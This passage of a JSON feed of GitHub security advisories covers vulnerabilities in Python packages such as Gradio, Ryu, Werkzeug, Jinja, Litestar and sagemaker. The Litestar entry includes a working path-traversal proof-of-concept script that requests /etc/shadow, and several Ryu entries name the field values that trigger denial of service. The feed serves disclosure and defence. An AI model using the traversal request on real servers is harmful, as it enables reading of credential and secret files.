        },
        {
            "content_html": "<p>Component Server in Gradio before 4.13 does not properly consider<code> _is_server_fn</code> for functions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34511\">https://nvd.nist.gov/vuln/detail/CVE-2024-34511</a></li>\n<li><a href=\"https://www.gradio.app/changelog#4-13-0\">https://www.gradio.app/changelog#4-13-0</a></li>\n<li><a href=\"https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2\">https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34rf-p3r3-58x2\">https://github.com/advisories/GHSA-34rf-p3r3-58x2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34rf-p3r3-58x2",
            "title": "[gradio] Gradio's Component Server does not properly consider` _is_server_fn` for functions",
            "date_modified": "2024-05-06T14:35:14.000Z",
            "date_published": "2024-05-05T21:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34rf-p3r3-58x2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If using <code>keep_typographic_whitespace=False</code> (which is the default), the sanitizer normalizes unicode to the NFKC form at the end. Some unicode characters normalize to chevrons; this allows specially crafted HTML to escape sanitization.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been fixed in 2.4.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Set <code>keep_typographic_whitespace=True</code> explicitly, or normalize to NFKC yourself earlier.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/matthiask/html-sanitizer/security/advisories/GHSA-wvhx-q427-fgh3\">https://github.com/matthiask/html-sanitizer/security/advisories/GHSA-wvhx-q427-fgh3</a></li>\n<li><a href=\"https://github.com/matthiask/html-sanitizer/commit/48db42fc5143d0140c32d929c46b802f96913550\">https://github.com/matthiask/html-sanitizer/commit/48db42fc5143d0140c32d929c46b802f96913550</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wvhx-q427-fgh3\">https://github.com/advisories/GHSA-wvhx-q427-fgh3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wvhx-q427-fgh3",
            "title": "[html-sanitizer] Arbitrary HTML present after sanitization because of unicode normalization",
            "date_modified": "2024-05-06T14:33:33.000Z",
            "date_published": "2024-05-06T14:33:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wvhx-q427-fgh3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>OFPHello</code> in parser.py in Faucet SDN Ryu 4.34 allows attackers to cause a denial of service (infinite loop) via <code>length=0</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34489\">https://nvd.nist.gov/vuln/detail/CVE-2024-34489</a></li>\n<li><a href=\"https://github.com/faucetsdn/ryu/issues/195\">https://github.com/faucetsdn/ryu/issues/195</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-59p2-v62x-gxj8\">https://github.com/advisories/GHSA-59p2-v62x-gxj8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-59p2-v62x-gxj8",
            "title": "[ryu] Ryu Infinite Loop vulnerability",
            "date_modified": "2024-05-06T14:33:15.000Z",
            "date_published": "2024-05-05T03:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-59p2-v62x-gxj8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>OFPFlowStats</code> in parser.py in Faucet SDN Ryu 4.34 allows attackers to cause a denial of service (infinite loop) via <code>inst.length=0</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34487\">https://nvd.nist.gov/vuln/detail/CVE-2024-34487</a></li>\n<li><a href=\"https://github.com/faucetsdn/ryu/issues/192\">https://github.com/faucetsdn/ryu/issues/192</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m9vm-8mv9-v5v3\">https://github.com/advisories/GHSA-m9vm-8mv9-v5v3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m9vm-8mv9-v5v3",
            "title": "[ryu] Ryu Infinite Loop vulnerability",
            "date_modified": "2024-05-06T14:33:06.000Z",
            "date_published": "2024-05-05T03:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m9vm-8mv9-v5v3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>OFPMultipartReply</code> in parser.py in Faucet SDN Ryu 4.34 allows attackers to cause a denial of service (infinite loop) via <code>b.length=0</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34488\">https://nvd.nist.gov/vuln/detail/CVE-2024-34488</a></li>\n<li><a href=\"https://github.com/faucetsdn/ryu/issues/191\">https://github.com/faucetsdn/ryu/issues/191</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ffp9-pfq9-g2ww\">https://github.com/advisories/GHSA-ffp9-pfq9-g2ww</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ffp9-pfq9-g2ww",
            "title": "[ryu] Ryu Infinite Loop vulnerability",
            "date_modified": "2024-05-06T14:32:53.000Z",
            "date_published": "2024-05-05T03:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ffp9-pfq9-g2ww"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>OFPPacketQueue</code> in parser.py in Faucet SDN Ryu 4.34 allows attackers to cause a denial of service (infinite loop) via <code>OFPQueueProp.len=0</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34486\">https://nvd.nist.gov/vuln/detail/CVE-2024-34486</a></li>\n<li><a href=\"https://github.com/faucetsdn/ryu/issues/190\">https://github.com/faucetsdn/ryu/issues/190</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fgpw-cx3v-wj95\">https://github.com/advisories/GHSA-fgpw-cx3v-wj95</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fgpw-cx3v-wj95",
            "title": "[ryu] Ryu Infinite Loop vulnerability",
            "date_modified": "2024-05-06T14:32:36.000Z",
            "date_published": "2024-05-05T03:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fgpw-cx3v-wj95"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>OFPBucket</code> in parser.py in Faucet SDN Ryu 4.34 allows attackers to cause a denial of service (infinite loop) via <code>action.len=0</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34484\">https://nvd.nist.gov/vuln/detail/CVE-2024-34484</a></li>\n<li><a href=\"https://github.com/faucetsdn/ryu/issues/194\">https://github.com/faucetsdn/ryu/issues/194</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c7w6-33j3-j3mx\">https://github.com/advisories/GHSA-c7w6-33j3-j3mx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c7w6-33j3-j3mx",
            "title": "[ryu] Ryu Infinite Loop vulnerability",
            "date_modified": "2024-05-06T14:32:17.000Z",
            "date_published": "2024-05-05T03:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c7w6-33j3-j3mx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>OFPGroupDescStats</code> in parser.py in Faucet SDN Ryu 4.34 allows attackers to cause a denial of service (infinite loop) via <code>OFPBucket.len=0</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34483\">https://nvd.nist.gov/vuln/detail/CVE-2024-34483</a></li>\n<li><a href=\"https://github.com/faucetsdn/ryu/issues/193\">https://github.com/faucetsdn/ryu/issues/193</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hmm-wg23-2w7m\">https://github.com/advisories/GHSA-7hmm-wg23-2w7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hmm-wg23-2w7m",
            "title": "[ryu] Ryu Infinite Loop vulnerability",
            "date_modified": "2024-05-06T14:30:05.000Z",
            "date_published": "2024-05-05T03:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hmm-wg23-2w7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985\">https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985</a></li>\n<li><a href=\"https://github.com/pallets/werkzeug/commit/3386395b24c7371db11a5b8eaac0c91da5362692\">https://github.com/pallets/werkzeug/commit/3386395b24c7371db11a5b8eaac0c91da5362692</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34069\">https://nvd.nist.gov/vuln/detail/CVE-2024-34069</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2g68-c3qc-8985\">https://github.com/advisories/GHSA-2g68-c3qc-8985</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2g68-c3qc-8985",
            "title": "[Werkzeug] Werkzeug debugger vulnerable to remote execution when interacting with attacker controlled domain",
            "date_modified": "2024-05-06T16:17:35.000Z",
            "date_published": "2024-05-06T14:21:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2g68-c3qc-8985"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>xmlattr</code> filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, <code>/</code>, <code>&gt;</code>, or <code>=</code>, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.</p>\n<p>Accepting keys as user input is now explicitly considered an unintended use case of the <code>xmlattr</code> filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting <em>values</em> as user input continues to be safe.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj\">https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj</a></li>\n<li><a href=\"https://github.com/pallets/jinja/commit/0668239dc6b44ef38e7a6c9f91f312fd4ca581cb\">https://github.com/pallets/jinja/commit/0668239dc6b44ef38e7a6c9f91f312fd4ca581cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34064\">https://nvd.nist.gov/vuln/detail/CVE-2024-34064</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h75v-3vvj-5mfj\">https://github.com/advisories/GHSA-h75v-3vvj-5mfj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h75v-3vvj-5mfj",
            "title": "[Jinja2] Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
            "date_modified": "2024-05-06T16:17:32.000Z",
            "date_published": "2024-05-06T14:20:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h75v-3vvj-5mfj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p><strong>Local File Inclusion via Path Traversal in LiteStar Static File Serving</strong></p>\n<p>A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a>. This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.</p>\n<h2 id=\"details\">Details</h2>\n<p>The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at <a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">line 70 in <code>litestar/static_files/base.py</code></a>.</p>\n<p>The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:</p>\n<pre><code class=\"language-python\">commonpath([str(directory), file_info[\"name\"], joined_path])\n</code></pre>\n<p>Given the variables:</p>\n<pre><code class=\"language-python\">directory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n</code></pre>\n<p>The function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h2>\n<p>To reproduce this vulnerability, follow these steps:</p>\n<ol>\n<li><p><strong>Set up the environment:</strong></p>\n<ul>\n<li>Install with pip the <code>uvicorn</code> and <code>litestar</code> packages.</li>\n<li>Create a <code>static</code> folder in the root directory of your project and place any file (e.g., an image) in it for testing.</li>\n<li>Ensure the static file serving is enabled, which is typically the default configuration.</li>\n</ul>\n</li>\n<li><p><strong>Preparation of the testing environment:</strong></p>\n<ul>\n<li>If using Ubuntu or a similar system, you can use <code>/etc/shadow</code> which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.</li>\n<li>Create a <code>main.py</code> file with the following content to configure and run the LiteStar server:</li>\n</ul>\n<pre><code class=\"language-python\">from pathlib import Path\nfrom litestar import Litestar\nfrom litestar.static_files import create_static_files_router\nimport uvicorn\n\napp = Litestar(\n    route_handlers=[\n        create_static_files_router(path=\"/static\", directories=[\"static\"]),\n    ],\n)\n\nif __name__ == \"__main__\":\n    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n</code></pre>\n<ul>\n<li>Run this script with the command <code>python3 main.py</code> to start the server.</li>\n</ul>\n</li>\n<li><p><strong>Exploit:</strong></p>\n<ul>\n<li>Prepare an exploit script named <code>exploit.py</code> with the following Python code to perform the HTTP request without client-side sanitization:</li>\n</ul>\n<pre><code class=\"language-python\">import http.client\n\ndef send_request(host, port, path):\n    connection = http.client.HTTPConnection(host, port)\n    connection.request(\"GET\", path)\n    response = connection.getresponse()\n    print(f\"Status: {response.status}\")\n    print(f\"Headers: {response.getheaders()}\")\n    data = response.read()\n    print(f\"Body: {data.decode('utf-8')}\")\n    connection.close()\n\nsend_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n</code></pre>\n<ul>\n<li>Execute this script using <code>python3 exploit.py</code>. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.</li>\n</ul>\n</li>\n<li><p><strong>Observe:</strong></p>\n<ul>\n<li>The server should respond with the contents of the <code>/etc/shadow</code> file, thereby confirming the path traversal vulnerability.</li>\n<li>The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"impact\">Impact</h2>\n<p>This Local File Inclusion vulnerability critically affects all instances of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:</p>\n<ol>\n<li><p><strong>Exposure of Sensitive Information:</strong></p>\n<ul>\n<li>The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.</li>\n</ul>\n</li>\n<li><p><strong>Potential for System Compromise:</strong></p>\n<ul>\n<li>If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a <code>.env</code> file might reveal environment variables used for application configurations that include database passwords or API keys.</li>\n</ul>\n</li>\n<li><p><strong>Credential Leakage:</strong></p>\n<ul>\n<li>Access to files such as <code>/etc/passwd</code> or <code>/etc/shadow</code> (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.</li>\n</ul>\n</li>\n<li><p><strong>Regulatory and Compliance Violations:</strong></p>\n<ul>\n<li>Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.</li>\n</ul>\n</li>\n<li><p><strong>Loss of Trust and Reputation Damage:</strong></p>\n<ul>\n<li>Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.</li>\n</ul>\n</li>\n<li><p><strong>Potential for Further Exploitation:</strong></p>\n<ul>\n<li>The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.</li>\n</ul>\n</li>\n</ol>\n<p>Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:</p>\n<h2 id=\"mitigation-suggestion\">Mitigation Suggestion</h2>\n<p>To effectively address the Local File Inclusion vulnerability via path traversal identified in the <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:</p>\n<ol>\n<li><p><strong>Input Validation and Sanitization:</strong></p>\n<ul>\n<li>Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as <code>../</code> which are used in path traversal attacks.</li>\n<li>Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.</li>\n</ul>\n</li>\n<li><p><strong>Path Normalization:</strong></p>\n<ul>\n<li>Normalize file paths before using them in file operations. Functions such as <code>os.path.normpath()</code> in Python can be used to normalize paths. This method resolves redundant separators and up-level references (<code>../</code>) to prevent directory traversal.</li>\n<li>As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:<pre><code class=\"language-python\">if os.path.commonpath([full_path, directory]) != directory:\n    # Don't allow misbehaving clients to break out of the static files\n    # directory.\n    continue\n</code></pre>\nThis snippet from <a href=\"https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166\">Starlette's implementation</a> ensures that the constructed file path does not traverse out of the specified directory.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"comments\">Comments</h2>\n<p><strong>Naming Convention:</strong></p>\n<ul>\n<li>From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"</li>\n<li>Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"</li>\n</ul>\n<p><strong>Feature Additions and Changes:</strong></p>\n<ul>\n<li>Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.</li>\n<li>Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32982\">https://nvd.nist.gov/vuln/detail/CVE-2024-32982</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b\">https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/advisories/GHSA-83pv-qr33-2vcf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf",
            "title": "[starlite] Litestar and Starlite vulnerable to Path Traversal",
            "date_modified": "2024-05-06T20:48:37.000Z",
            "date_published": "2024-05-06T14:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Couchbase Sync Gateway 3.x before 3.0.2. Admin credentials are not verified when using X.509 client-certificate authentication from Sync Gateway to Couchbase Server. When Sync Gateway is configured to authenticate with Couchbase Server using X.509 client certificates, the admin credentials provided to the Admin REST API are ignored, resulting in privilege escalation for unauthenticated users. The Public REST API is not impacted by this issue. A workaround is to replace X.509 certificate based authentication with Username and Password authentication inside the bootstrap configuration.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-32563\">https://nvd.nist.gov/vuln/detail/CVE-2022-32563</a></li>\n<li><a href=\"https://www.couchbase.com/alerts/#CVE-2022-32563\">https://www.couchbase.com/alerts/#CVE-2022-32563</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9266-j9v3-q4j5\">https://github.com/advisories/GHSA-9266-j9v3-q4j5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9266-j9v3-q4j5",
            "title": "[couchbase] Couchbase Sync Gateway admin credentials not verified when using X.509 client cert authentication",
            "date_modified": "2024-05-04T05:02:36.000Z",
            "date_published": "2022-06-11T00:00:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9266-j9v3-q4j5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The capture_dependencies function in <code>sagemaker.serve.save_retrive.version_1_0_0.save.utils</code> module before version 2.214.3 allows for potentially unsafe Operating System (OS) Command Injection if inappropriate command is passed as the “requirements_path” parameter. This consequently may allow an unprivileged third party to cause remote code execution, denial of service, affecting both confidentiality and integrity.</p>\n<p>Impacted versions: &lt;2.214.3</p>\n<h3 id=\"credit\">Credit</h3>\n<p>We would like to thank HiddenLayer for collaborating on this issue through the coordinated vulnerability disclosure process.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not override the “requirements_path” parameter of capture_dependencies function in <code>sagemaker.serve.save_retrive.version_1_0_0.save.utils</code>, instead use the default value.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our vulnerability reporting page [1] or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.\n[1] Vulnerability reporting page: <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">https://aws.amazon.com/security/vulnerability-reporting</a></p>\n<p>Fixed by: <a href=\"https://github.com/aws/sagemaker-python-sdk/pull/4556\">https://github.com/aws/sagemaker-python-sdk/pull/4556</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-7pc3-pr3q-58vg\">https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-7pc3-pr3q-58vg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34073\">https://nvd.nist.gov/vuln/detail/CVE-2024-34073</a></li>\n<li><a href=\"https://github.com/aws/sagemaker-python-sdk/pull/4556\">https://github.com/aws/sagemaker-python-sdk/pull/4556</a></li>\n<li><a href=\"https://github.com/aws/sagemaker-python-sdk/commit/2d873d53f708ea570fc2e2a6974f8c3097fe9df5\">https://github.com/aws/sagemaker-python-sdk/commit/2d873d53f708ea570fc2e2a6974f8c3097fe9df5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7pc3-pr3q-58vg\">https://github.com/advisories/GHSA-7pc3-pr3q-58vg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7pc3-pr3q-58vg",
            "title": "[sagemaker] sagemaker-python-sdk Command Injection vulnerability",
            "date_modified": "2024-05-03T20:26:04.000Z",
            "date_published": "2024-05-03T20:26:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7pc3-pr3q-58vg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>sagemaker.base_deserializers.NumpyDeserializer module before v2.218.0 allows potentially unsafe deserialization when untrusted data is passed as pickled object arrays. This consequently may allow an unprivileged third party to cause remote code execution, denial of service, affecting both confidentiality and integrity.</p>\n<p>Impacted versions: &lt;2.218.0.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>We would like to thank HiddenLayer for collaborating on this issue through the coordinated vulnerability disclosure process.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not pass pickled numpy object arrays which originated from an untrusted source, or that could have been tampered with. Only pass pickled numpy object arrays from sources you trust.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our vulnerability reporting page [1] or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.\n[1] Vulnerability reporting page: <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">https://aws.amazon.com/security/vulnerability-reporting</a></p>\n<p>Fixed by: <a href=\"https://github.com/aws/sagemaker-python-sdk/pull/4557\">https://github.com/aws/sagemaker-python-sdk/pull/4557</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-wjvx-jhpj-r54r\">https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-wjvx-jhpj-r54r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34072\">https://nvd.nist.gov/vuln/detail/CVE-2024-34072</a></li>\n<li><a href=\"https://github.com/aws/sagemaker-python-sdk/pull/4557\">https://github.com/aws/sagemaker-python-sdk/pull/4557</a></li>\n<li><a href=\"https://github.com/aws/sagemaker-python-sdk/commit/72e0c9712aec6fbb82fb40fda091dfc2a42c70a0\">https://github.com/aws/sagemaker-python-sdk/commit/72e0c9712aec6fbb82fb40fda091dfc2a42c70a0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wjvx-jhpj-r54r\">https://github.com/advisories/GHSA-wjvx-jhpj-r54r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wjvx-jhpj-r54r",
            "title": "[sagemaker] sagemaker-python-sdk vulnerable to Deserialization of Untrusted Data",
            "date_modified": "2024-05-03T20:25:34.000Z",
            "date_published": "2024-05-03T20:25:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wjvx-jhpj-r54r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>pgAdmin &lt;= 8.5 is affected by XSS vulnerability in /settings/store API response json payload. This vulnerability allows attackers to execute malicious script at the client end.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4216\">https://nvd.nist.gov/vuln/detail/CVE-2024-4216</a></li>\n<li><a href=\"https://github.com/pgadmin-org/pgadmin4/issues/7282\">https://github.com/pgadmin-org/pgadmin4/issues/7282</a></li>\n<li><a href=\"https://github.com/pgadmin-org/pgadmin4/commit/e384c9665ae2e72376be7cefa8e652efcee93767\">https://github.com/pgadmin-org/pgadmin4/commit/e384c9665ae2e72376be7cefa8e652efcee93767</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xv64-8p4r-94gq\">https://github.com/advisories/GHSA-xv64-8p4r-94gq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xv64-8p4r-94gq",
            "title": "[pgAdmin4] pgAdmin Cross-site Scripting vulnerability in /settings/store API response json payload",
            "date_modified": "2024-05-03T20:20:33.000Z",
            "date_published": "2024-05-02T18:30:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xv64-8p4r-94gq"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}